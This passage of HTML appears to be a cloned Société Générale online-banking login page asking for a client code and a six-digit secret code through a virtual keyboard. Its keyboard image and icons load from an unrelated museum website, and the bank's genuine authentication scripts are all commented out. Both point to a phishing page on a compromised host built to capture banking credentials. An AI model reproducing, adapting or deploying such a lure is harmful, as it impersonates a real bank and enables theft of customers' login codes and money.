				<input id="user_id" name="user_id" type="text" class="auth-input-erasable auth-login swm_input grey_cross eer_input__field ngim-input" autocapitalize="off" autocorrect="off" aria-label="Code client" placeholder=" " autocomplete="off" maxlength="8" aria-describedby="js-error" required=""> <span class="swm_sprite swm_to-clear" id="user_id-delete"> <a class="swm_icone swm_effacer" aria-label="Effacer le code client" role="button" href="javascript:void(0)"></a> </span> <span class="bar" aria-hidden="true"></span> <label for="user_id">Saisissez votre code client</label> </div>

			<div id="js-error" aria-live="assertive" class="auth_error" tabindex="-1" aria-hidden="true" style="display: none;"> <div class="error-wrapper"> <div class="inner">      <div class="message">Votre identifiant est incorrect</div>    </div> </div></div>

			</div>
			<div class="auth-checkbox-wrapper auth-check-left swm_block-element" id="saveId-container"> <div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client"> <input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0"> <label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span> <div class="toggle-btn-handle"></div> </label> </div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span> <div class="swm_infohover swm_input-info" role="button" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="swm_sprite-info--off"></span> <div class="swm_infopopin swm_infobulle"> <p class="swm_espace">Se souvenir de moi</p> <p>En cochant cette case, votre code client sera mémorisé sur cet appareil.</p> <p class="swm_espace">De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.</p> <p class="swm_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p> <button class="swm_button-secondaire swm_button-arrondi">J'ai compris</button> </div> </div> </div> <div class="auth-cs-content-validate" id="btn-container">   <button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-validate" type="button" aria-label="Valider votre identifiant">Valider</button> <br> </div>
			<input type="hidden" id="pass_id" name="pass_id" value="">
			</form></div>  </div>

			<div id="clavier" class="loaded" style="display: none;">






<div class="component-authent-cv swm_block" aria-expanded="true" id="sonore-vk">

    <div class="auth-cs-cont swm-vk">

        <div class="auth-cs-content-code auth-cs-content swm-vk swm_block-element">




                <button aria-label="Fermer la popin" id="closeKeyBoard"></button>


            <div class="auth-cs-content-code-input row_section swm_input-container">






                        <input id="codeSecret" type="text" class="auth-input-erasable auth-pwd swm_input grey_cross auth-pwd-0" aria-describedby="js-error" readonly="readonly" aria-hidden="true" maxlength="6" placeholder=" " required="">
                        <div class="swm_sprite swm_to-clear" id="codeSecret-delete"></div>
                        <div id="js-error" aria-live="assertive" class="auth_error"></div>





            </div>
        </div>
        <div>
            <div id="gda_vk" class="clavier-container swm_block-element swm_conteneur_clavier swm-visible">
                <div id="img_container" class="img-container">
                    <img id="img_clavier" class="keyboard swm_block-element swm_conteneur_clavier" usemap="#tc_tclavier" src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/gen_ui.png"><div id="hover_touche_4_4" role="button" class="hover" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_3" role="button" class="hover" style="position: absolute; left: 120px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_2" role="button" class="hover" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_1" role="button" class="hover" style="position: absolute; left: 0px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_3_4" role="button" class="hover" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_3" role="button" class="hover" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_2" role="button" class="hover" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_1" role="button" class="hover" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_2_4" role="button" class="hover" style="position: absolute; left: 180px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_3" role="button" class="hover" style="position: absolute; left: 120px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_2" role="button" class="hover" style="position: absolute; left: 60px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_1" role="button" class="hover" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_1_4" role="button" class="hover" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_3" role="button" class="hover" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_2" role="button" class="hover" style="position: absolute; left: 60px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_1" role="button" class="hover" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
                </div>
				<div id="js-error-2" aria-live="assertive" class="auth_error" tabindex="-1" aria-hidden="true" style="display: none;"> <div class="error-wrapper"> <div class="inner">      <div class="message">Le code secret saisi est incorrect. Merci de bien vouloir ressaisir votre code secret composé de 6 chiffres.</div>    </div> </div></div>
            </div>
        </div>

        <div class="auth-cs-content-validate">



                    <button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-authent" type="button" aria-label="Valider votre code secret">Valider</button>







                            <div class="sonore-Keyboard swm_block-element">
                                <a id="activeKS" class="swm_link" tabindex="0" href="javascript:void(0)">Activer le clavier sonore</a>
                            </div>







        </div>
    </div>
</div></div>

			</div>  </div>







      </div>





<script>
	/*
    var fun;
    function onSWMLoaded(params) {
        if ("") {
            var callback = params.error ? params.error : swm.commun.showErrorMessage.call(this, "", "/restitution/cns_listeprestation.html");
            fun = callback.bind(this);
            window.swm ? callback() : document.addEventListener("swm.onLoad", fun);
        } else {
            fun = initSWM.bind(this, params.success);
            window.swm ? initSWM(params.success) : document.addEventListener("swm.onLoad", fun);
        }
    }

    function initSWM(callback) {

        window.jQueryForSwm = swm.$;
        window.swmAutoInit = false;
        (function(a,b){if(typeof define==="function"&&define.amd){if(typeof(swmAutoInit)==="undefined"){swmAutoInit=false}define(["jquery"],b)}else{if(typeof(swmAutoInit)==="undefined"){swmAutoInit=true}var c=a.jQueryForSwm||a.jQuery;if(typeof(c)==="undefined"){throw new Error("jQuery is missing !")}b(c)}}(this,function(h){var g={};var n;var m=false;var i=false;var p={getJetonCallback:[],iStockageJetonActifCallback:[]};var o={};g.consts={};g.consts.niveauSensibilite={};g.consts.niveauSensibilite.NORMAL={value:0};g.consts.niveauSensibilite.SENSIBLE={value:100};g.consts.niveauSensibilite.TRES_SENSIBLE={value:200};if(typeof(swmConfOverride)!=="undefined"){g.version=(""+swmConfOverride.version)}else{g.version=(""+new Date().getTime())}g.loadSwm=function(){k("The method swm.loadSwm is deprecated, please use swm.init instead.");g.init.apply(g,arguments)};g.init=function(s){var t={mainJsPath:"/js/swm.main.js",swmMain:undefined};h.extend(t,s);function u(){g.config=n.config;g.$=n.$;m=false;i=true;c();h(document).triggerExternal("swm.available",n)}g.addConf({onAuthent:t.onAuthent,onBack:t.onBack,onClose:t.onClose,onConnecting:t.onConnecting,onInitDone:t.onInitDone,onLoadingError:t.onLoadingError,onLogout:t.onLogout,ajaxFilterRegExp:t.ajaxFilterRegExp,ajaxFilterJquery:t.ajaxFilterJquery,baseUrl:t.baseUrl});if(!i){n=t.swmMain;if(typeof(n)!="undefined"){setTimeout(u,0)}else{b("swm.init",function(v){n=v;u()});if(!m){m=true;var r=g.version;var q;if(typeof(swmConfOverride)!="undefined"&&swmConfOverride.staticBaseUrl){q=(t.baseUrl||"")+swmConfOverride.staticBaseUrl+t.mainJsPath}else{q="/swm/resources/version/"+r+t.mainJsPath}if(typeof gdaPublicUri!="undefined"){q=gdaPublicUri+q}a(q,function(){h(document).trigger("swm.loadingError")})}}}else{h(document).triggerExternal("swm.available",n)}};if(swmAutoInit){var f=h.fn.on||h.fn.bind;f.call(h(document),"swm.loaded",function(){g.init()})}swmAutoInit=undefined;g.ajaxFilter=function(q){if(n){q.ajaxFilterJquery=(q.ajaxFilterJquery||h);if(q.ajaxFilterRegExp){q.ajaxFilterJquery.ajax=n.filterAjaxRequests(q).overridedAjax}return q.ajaxFilterJquery.ajax}else{p.ajaxFilter=[q]}};g.onLogout=function(q){b("swm.logout",q)};g.onClose=function(q){b("swm.close",q)};g.onConnecting=function(q){b("swm.connecting",q)};g.onBack=function(q){b("swm.back",q)};g.onLogoutError=function(q){b("swm.logout.error",q)};g.onAuthent=function(q){b("swm.postchgtnivauth",q)};g.setStockageJetonActif=function(q){q=(q==true);if(n){n.data.setStockageJetonActif(q)}else{p.stockageJetonActif=q}};g.isStockageJetonActif=function(q){if(e(q)){if(n){setTimeout(function(){q(n.data.isStockageJetonActif())},0)}else{p.iStockageJetonActifCallback.push(q);return undefined}}};g.getJeton=function(q){if(e(q)){if(n){setTimeout(function(){q(n.data.getJeton())},0)}else{p.getJetonCallback.push(q);return undefined}}};g.getIdStat=function(){if(n){return n.data.getIdStat()}return undefined};g.reattribuerCodeSecret=function(q,r){if(n){n.reattribuerCodeSecret(q,r)}else{p.reattribuerCodeSecret=[q,r]}};g.sign=function(q,s){if(n){return n.sign(q,s)}else{var r={getData:function(){return new Error("Signature non prÃªte public.")}};p.signature={params:[q,s],promise:r};if(typeof(q)==="string"){return r}}};g.triggerSwmLogout=function(){if(n){return n.triggerSwmLogout()}else{return new Error("triggerSwmLogout non prÃªte public.")}};g.record=function(q){if(n){return n.record(q)}};g.checkSign=function(q){if(n){return n.checkSign(q)}else{p.checkSignature=arguments}};g.gda_handleResponse=function(t,r,s,q){if(n){return n.gda_handleResponse(t,r,s,q)}else{return undefined}};g.errorSign=function(q){if(n){return n.errorSign(q)}else{p.errorSignature=arguments}};g.getDateDerniereConnexion=function(){if(n){return n.data.getDateDerniereConnexion()}return undefined};g.getCanalDerniereConnexion=function(){if(n){return n.data.getCanalDerniereConnexion()}return undefined};g.getDroits=function(){if(n){return n.data.getDroits()}return undefined};g.logout=function(){if(n){n.logout.apply(g,arguments)}else{p.logout=arguments}};g.logoutSupervision=function(){k("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead.");g.logout()};g.resetAuthentData=function(){if(n){n.data.resetAuthentData.apply(g,arguments)}else{p.resetAuthentData=arguments}};g.isAuthenticated=function(){if(n){return n.isAuthenticated()}return false};g.authent=function(r,q,s){if(n){q=q||function(t){if(o.preSuccess==="function"){o.preSuccess(t,function(){o.success(t)})}else{o.success(t)}};s=s||o.error;return n.authent(r,q,s)}else{p.authent={params:[r,q,s]}}return false};g.setDefaultAuthentCallbacks=function(q){o.preSuccess=q.preSuccess||o.preSuccess;o.success=q.success||o.success;o.error=q.error||o.error};g.changeCodeSecret=function(r,s,q){if(n){return n.changeCodeSecret(r,s,q)}else{p.changeCodeSecret=[r,s,q]}return false};g.changeCodeSecretDelegue=function(r,s,q){if(n){return n.changeCodeSecret(r,s,q)}else{p.changeCodeSecret=[r,s,q]}return false};g.addConf=function(q){q.onAuthent&&b("swm.postchgtnivauth",q.onAuthent);q.onLogout&&b("swm.logout",q.onLogout);q.onBack&&b("swm.back",q.onBack);q.onClose&&b("swm.close",q.onClose);q.onConnecting&&b("swm.connecting",q.onConnecting);q.onLoadingError&&b("swm.loadingError",q.onLoadingError);if(q.ajaxFilterRegExp){var r={ajaxFilterRegExp:q.ajaxFilterRegExp,ajaxFilterJquery:q.ajaxFilterJquery,ajaxFilterAxios:q.ajaxFilterAxios};g.ajaxFilter(r)}if(q.baseUrl){j(q.baseUrl)}if(typeof(n)!="undefined"){q.onInitDone&&q.onInitDone()}else{q.onInitDone&&b("swm.available",q.onInitDone)}};function j(q){if(n){n.config.baseUrl=q}else{p.setBaseUrl=[q]}}function c(){if(p.ajaxFilter){g.ajaxFilter.apply(g,p.ajaxFilter)}if(p.setBaseUrl){j.apply(g,p.setBaseUrl)}if(p.stockageJetonActif){g.setStockageJetonActif(p.stockageJetonActif)}while(p.iStockageJetonActifCallback.length>0){g.isStockageJetonActif(p.iStockageJetonActifCallback.pop())}p.iStockageJetonActifCallback=[];while(p.getJetonCallback.length>0){g.getJeton(p.getJetonCallback.pop())}p.getJetonCallback=[];if(p.changeCodeSecret){g.changeCodeSecret.apply(g,p.changeCodeSecret)}if(p.logout){g.logout.apply(g,p.logout)}if(p.logoutSupervision){g.logoutSupervision.apply(g,p.logoutSupervision)}if(p.checkSignature){g.checkSign.apply(g,p.checkSignature)}if(p.errorSignature){g.errorSign.apply(g,p.errorSignature)}if(p.signature){var q=g.sign.apply(g,p.signature.params);if(q&&typeof(q)=="object"){p.signature.promise.getData=q.getData}}if(p.resetAuthentData){g.resetAuthentData.apply(g,p.resetAuthentData)}if(p.authent){g.authent.apply(g,p.authent.params)}p={getJetonCallback:[],iStockageJetonActifCallback:[],authent:undefined}}function e(q){return typeof q=="function"}h.fn.triggerExternal=function(q,s){if(document.dispatchEvent){var r=document.createEvent("Event");r.initEvent(q,true,true);r.data=s;document.dispatchEvent(r);var u=(window.self!==window.top);if(u){try{top.document.dispatchEvent(r)}catch(t){}}}else{document.documentElement[q]=s}h(document).trigger(q,s)};function b(q,r){if(document.addEventListener){document.addEventListener(q,function(s){r(s.data)},false)}else{if(document.attachEvent){document.documentElement.attachEvent("onpropertychange",function(s){if(s.propertyName==q){r(document.documentElement[q])}})}}}function a(r,s){if(typeof(h.Deferred)!=="undefined"){var q=l(r);h.when(q).fail(s)}else{d(r,s)}}function l(s){var q=h.Deferred(),r=document.createElement("script");r.async="async";r.type="text/javascript";r.src=s;r.onload=r.onreadystatechange=function(u,t){if(!r.readyState||/loaded|complete/.test(r.readyState)){if(t){q.reject()}else{q.resolve()}}};r.onerror=function(){q.reject()};h("head")[0].appendChild(r);return q.promise()}function d(s,t){var q=document.createElement("script");q.async=false;q.src=s;q.type="text/javascript";q.charset="UTF-8";q.onerror=t;var r=document.getElementsByTagName("head")[0];r.appendChild(q)}function k(r){try{if(typeof(console)!=="undefined"&&console&&typeof(console.warn)==="function"){console.warn("[SWM] "+r)}}catch(q){}}setTimeout(function(){h(document).trigger("swm.loaded",g)},0);window.swmApi=g;return g}));
        swmApi.init({
            swmMain: swm
        });
        swm.commun.setGdaReplay("/swm/swm-connect.html", "Kp8tJo+R2V+E2nu9xSaByqEyzwYsAQAAAQAAABsAAAAvY29tL2ljZC13ZWIvY2JvL2luZGV4Lmh0bWw=");
        document.removeEventListener("swm.onLoad", fun);
        fun = undefined;
        callback && callback();
    }
	*/
</script>

        <script>
			/*
            onSWMLoaded({
                success: function() {

                    swmApi.setDefaultAuthentCallbacks({
                        success : function(rsp) {
                            swm.commun.replayInterceptedPage();
                        },
                        error: function(err) {
                            swm.defaultAuthentError(err, "/restitution/cns_listeprestation.html");
                        }
                    });

                    swmApi.authent("300");
                }
            });
			*/
        </script>

    </div>



<!-- <script type="text/javascript" src="/icd/static/swm/resources/version/19.43.7/js/swm.main.js" charset="UTF-8"></script> -->








    <img src="/icd/static/swm/resources/version/19.43.7/markets/BDDF/PRI/INT/img/loader.gif" style="display: none; width: 0; height: 0;">

    <script type="text/javascript">
		/*
        if (typeof(swm) != "undefined" && swm.onLogout) {
            swm.onLogout(function() {
                document.location.href = '/restitution/cns_listeprestation.html';
            });
        }
		*/
    </script>










</div>


                </section>
	<section class="dcw_gb9_core-right">



















		<div>

			<div>
				<link href="/static/Particuliers/Home/Login-Page/User-Login-Page/css/eo2680-style.css" rel="stylesheet">
<div id="swm-content-default">
<p><br>
<strong>Obtenir vos codes</strong><br>
<br>
Le code client vous est attribué par un conseiller au moment de votre inscription au contrat Banque à distance en agence. Lors d'une ouverture de compte en ligne, le code client vous est envoyé par courrier. Il est également indiqué sur vos relevés de comptes.<br>
<br>
<strong>Code secret oublié</strong><br>
<br>
<a style="text-decoration: underline !important" href="/swm/swm-reattribution.html" class="dcw_card-visual_regular-link">
<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Effectuer une nouvelle demande</a><br>
<br>
<br>
<strong>Urgences carte bancaire</strong><br>
<br>
<a style="text-decoration: underline !important;" href="/aides-contact/contact-services-urgence" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Faire opposition à votre carte bancaire</a><br>
<a style="text-decoration: underline !important;" href="/secure/comptes-budget/mes-cartes/reclamation-carte" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Verrouiller votre carte bancaire</a><br>
<br>
<br>
<strong>Nos conseils sécurité</strong><br>
<br>
<a style="text-decoration: underline !important;" href="/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Découvrez le Pass sécurité</a><br>
<a style="text-decoration: underline !important;" href="/securite/mesures-de-securite" class="dcw_card-visual_regular-link" aria-label="Voir les menaces identifiées"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Voir les menaces identifiées</a><br>
<a style="text-decoration: underline !important;" href="/securite/bonnes-pratiques-securite-pour-eviter-les-fraudes" class="dcw_card-visual_regular-link" aria-label="Voir le Guide des bonnes pratiques"><img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/arrow.png" class="arrow_image">Guide des bonnes pratiques</a></p>
</div>

<div id="swm-content-oob" style="display:none">
<div class="eo2680-pass">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="/static/Particuliers/Home/Login-Page/User-Login-Page/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-pass--txt"><strong>Comment ça se passe ?</strong><br>
Une demande de connexion est envoyée en temps réel sur votre mobile dans l’Appli Société Générale. Il vous suffit de la valider depuis votre mobile. <a style="text-decoration: underline !important;" href="https://particuliers.societegenerale.fr/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>

<hr>
<p class="eo2680-pass--txt"><strong>Vous avez changé de numéro de téléphone ?</strong><br>
Vous pouvez modifier votre numéro de téléphone en appelant notre serveur vocal au +33 825 007 111 (0,05 eur TTC/min + prix d'un appel) ou en vous rendant dans votre agence. <a style="text-decoration: underline !important;" href="https://particuliers.societegenerale.fr/securite/telephone-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Communiquer votre numéro de téléphone Sécurité</a></p>

<hr>
<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-oob --></div>
<!-- #### -->

<div id="swm-content-otp" style="display:none">
<div class="eo2680-oob">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="/static/Particuliers/Home/Login-Page/User-Login-Page/img/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne*</strong>, applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à <strong>une authentification renforcée tous les 90 jours</strong>.</p>
</div>
<!-- #eo2680-card -->

<div class="eo2680-card"><span><strong>Le saviez vous ?</strong></span>

<figure><img src="/static/Particuliers/Home/Login-Page/User-Login-Page/img/s-curit-renforc-e-2.png"></figure>

<p>Le <strong>Pass Sécurité</strong> disponible dans l’Appli Société Générale vous permet de <strong>valider très simplement</strong> les actions nécessitant une<strong> authentification renforcée</strong>. Plus besoin de mémoriser et saisir le Code Sécurité reçu par SMS : tout se passe instantanément dans l’Appli ! <a style="text-decoration: underline !important;" href="https://particuliers.societegenerale.fr/securite/pass-securite" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"> <svg aria-hidden="true" focusable="false"> <use height="100%" width="100%" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use> </svg> Tout savoir sur le Pass Sécurité</a></p>
</div>
<!-- #eo2680-card -->

<p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)</p>
</div>
<!-- #eo2680-otp --></div>

			</div>

		</div>




</section>
<section class="dcw_gb_row dcw_gb_clearfix">



















		<div>

			<div>
				<script type="text/javascript">
				/*
  var element = document.querySelector('.rsp_header');
  element.classList.add("js-header-lhs-auth");
  */
</script>

			</div>

		</div>




</section>
</section>
	</main>
	<!-- <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=AW-1004456575"></script> -->
<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
    <div class="dcw_msg-banner_msg-wrapper">
        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#info"></use></svg>
        <p class="dcw_msg-banner_message">
            En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="/charte-cookies-societe-generale" class="eip_dcw_main-link">cliquez ici</a></span>.
        </p>
        <button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
        </button>
    </div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">&nbsp;</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
</aside>

<footer class="dcw_footer" role="contentinfo">
	<div class="dcw_footer-second">
		<div class="dcw_footer_container">
			<nav class="dcw_footer-second_nav">
				<ul class="dcw_footer-second_list">
					    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#localisation"></use></svg>
            Trouver une agence
</a>    </li>
    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="/icd/pch/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#question"></use></svg>
            Questions fréquentes
</a>    </li>
<li class="dcw_footer-second_item">
							<div class="dcw_dropdown js-dropdown-light">
    <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#arrow-dropdown"></use></svg>
    <ul class="dcw_dropdown_list toggle_content">
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://professionnels.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="professionnels">Professionnels</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://entreprises.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="entreprises">Entreprises</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://associations.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="associations">Associations</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.societegenerale.com/fr/accueil" data-tms-click-type="N" data-tms-element-label="groupe-société-générale">Groupe Société Générale</a>
            </li>
    </ul>
</div></li>
					</ul>
			</nav>
			<ul class="dcw_footer_container dcw_footer-second_social">
				    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#facebook-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#twitter-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#instagram"></use></svg>
</a>    </li>
</ul>
		</div>
	</div>
	<nav class="dcw_footer-third">
		<div class="dcw_footer_container">
			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="/static/Resources/img/logo/logo-sg-seul.svg" width="150" height="30">
<ul class="dcw_footer-third_list">
				    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/tous-nos-tarifs" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/engagements" data-tms-click-type="N" data-tms-element-label="nos-engagements">Nos engagements</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/informations-mentions-legales" data-tms-click-type="N" data-tms-element-label="informations-légales">Informations légales</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/charte-cookies-societe-generale" data-tms-click-type="N" data-tms-element-label="charte-cookies">Charte Cookies</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/securite" data-tms-click-type="N" data-tms-element-label="sécurité">Sécurité</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="/engagements/gestion-donnees-personnelles-rgpd" data-tms-click-type="N" data-tms-element-label="données-personnelles">Données personnelles</a>
    </li>
</ul>
		</div>
	</nav>
	</footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /authen/footer, FURL_ID: 1983c1c77d92f510VgnVCM100000030013acRCRD -->








